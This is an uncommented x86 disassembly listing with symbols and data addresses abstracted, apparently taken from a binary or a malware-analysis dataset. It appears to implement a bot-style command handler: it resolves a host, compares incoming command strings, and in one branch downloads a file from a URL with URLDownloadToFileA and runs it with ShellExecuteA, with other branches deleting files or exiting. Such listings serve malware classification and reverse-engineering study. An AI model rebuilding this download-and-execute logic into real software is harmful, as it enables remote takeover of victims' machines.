call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40efb5
add esp 0x24
lea ecx [ ebp - 0x1c ]
mov [ rw-data ] 0x2
push 0x0
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov esi rw-data
push r--data
push 0x28
mov ecx esi
call sub_401289
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
test al al
je r-xdata
and [ ebp - 0x74 ] 0x0
xor eax eax
lea edi [ ebp - 0x73 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
call sub_40e69c
push edx
push eax
lea eax [ ebp - 0x74 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea ecx [ ebp - 0x4c ]
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x38 ]
push 0xa
push eax
push [ rw-data ]
call [ _itoa@IAT ]
push ecx
lea ecx [ ebp - 0x1c ]
mov edi esp
push rw-data
push ebx
push 0x0
call sub_401289
push eax
lea eax [ ebp - 0x38 ]
push ebx
push eax
push ebx
call [ GetTickCount@IAT ]
push eax
lea eax [ ebp - 0x2d4 ]
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
push ebx
call sub_40e898
push eax
lea eax [ ebp - 0x2b4 ]
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
mov al [ rw-data ]
push ebx
push eax
lea eax [ ebp - 0x294 ]
push ebx
push eax
call sub_40e85d
push eax
lea eax [ ebp - 0x274 ]
push eax
call sub_40edd3
add esp 0xc
push eax
push ebx
push rw-data
push ebx
push rw-data
lea eax [ ebp - 0x4c ]
push ebx
push eax
push ebx
push r--data
lea eax [ ebp - 0x74 ]
push ebx
push eax
push ebx
push rw-data
push ebx
push rw-data
lea eax [ ebp - 0x254 ]
push ebx
push eax
call sub_40818a
pop ecx
push eax
push ebx
lea eax [ ebp - 0x234 ]
push rw-data
push eax
call sub_40edd3
pop ecx
pop ecx
push eax
push ebx
push 0x1
mov ecx esi
call sub_401289
push eax
push ebx
lea eax [ ebp - 0x214 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1f4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1b4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x194 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x174 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x154 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x134 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x114 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xf4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xd4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1e4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x284 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1c4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x304 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1a4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x184 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2c4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x164 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x244 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x144 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x324 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x124 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x224 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x104 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2a4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xe4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x204 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2e4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov edi rw-data
add esp 0xc
mov ecx edi
call sub_402198
lea ecx [ ebp - 0x2e4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x204 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xe4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2a4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x104 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x224 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x124 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x324 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x144 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x244 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x164 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2c4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x184 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1a4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x304 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1c4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1e4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xd4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xf4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x114 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x134 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x154 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x174 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x194 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1b4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1d4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1f4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x214 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x234 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x254 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x274 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x294 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2b4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2d4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push sub_40a71e
mov ecx edi
call sub_40221c
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x5c ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x4e ]
push eax
lea ecx [ ebp - 0x334 ]
movzx eax [ ebp - 0x50 ]
push eax
movzx eax [ ebp - 0x52 ]
push eax
movzx eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x9 ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x264 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x264 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x334 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push 0x28
mov ecx esi
call sub_401289
push eax
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov ecx rw-data
call sub_404336
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x2c ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x1e ]
push eax
lea ecx [ ebp - 0x314 ]
movzx eax [ ebp - 0x20 ]
push eax
movzx eax [ ebp - 0x22 ]
push eax
movzx eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0xa ]
push r--data
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x2f4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ printf@IAT ]
add esp 0x14
lea ecx [ ebp - 0x2f4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x314 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40a71e
push ebp
mov ebp esp
sub esp 0x6d8
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0xec ]
lea edi [ esi + 0x18 ]
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ esi + 0x28 ]
call [ SetEvent@IAT ]
push [ esi + 0x28 ]
call [ CloseHandle@IAT ]
sub esp 0x10
mov esi rw-data
mov ecx esp
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
mov ecx esp
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40efb5
add esp 0x24
lea ecx [ ebp - 0x10 ]
call sub_4012b5
test eax eax
jbe r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401b3c
lea ecx [ ebp - 0xec ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ebx [ std::operator==@IAT ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
mov edi [ atoi@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
call [ GetTickCount@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_40ed35
push ecx
push ecx
mov edi esp
push eax
push esi
call sub_40e898
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x84 ]
push esi
push eax
call sub_40e85d
push eax
lea eax [ ebp - 0x94 ]
push eax
call sub_40edd3
add esp 0xc
lea ecx [ ebp - 0x10 ]
push eax
push esi
push 0x1
call sub_401289
push eax
push esi
lea eax [ ebp - 0xdc ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0xcc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xbc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xfc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x30 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
mov esi rw-data
add esp 0xc
mov ecx esi
call sub_402198
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xfc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xbc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xcc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xdc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi [ atoi@IAT ]
push eax
call edi
test eax eax
pop ecx
jbe r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
mov ecx rw-data
jmp r-xdata
push r--data
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
add eax eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_4022e6
push [ ebp + 0x8 ]
mov ecx esi
test al al
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40bea2
add esp 0x10
jmp r-xdata
call sub_402791
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
mov ecx esi
call sub_402646
jmp r-xdata
call sub_4026f2
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x30 ]
push 0x30
push eax
call sub_40712f
add esp 0xc
xor esi esi
lea ecx [ ebp - 0x30 ]
push esi
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call URLDownloadToFileA
push 0x1
push esi
push esi
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push r--data
push esi
call [ ShellExecuteA@IAT ]
lea ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x30 ]
push 0x30
push eax
call sub_40712f
add esp 0xc
lea ecx [ ebp - 0x30 ]
push 0x1
push 0x32
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x188 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
push 0x0
call [ exit@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push r--data
push eax
call ebx
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp + 0x8 ]
push 0xa
push eax
call [ GetCurrentProcessId@IAT ]
push eax
call [ _itoa@IAT ]
push ecx
lea eax [ ebp + 0x8 ]
mov edi esp
push eax
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_4081b7
pop ecx
push eax
push esi
lea eax [ ebp - 0x84 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
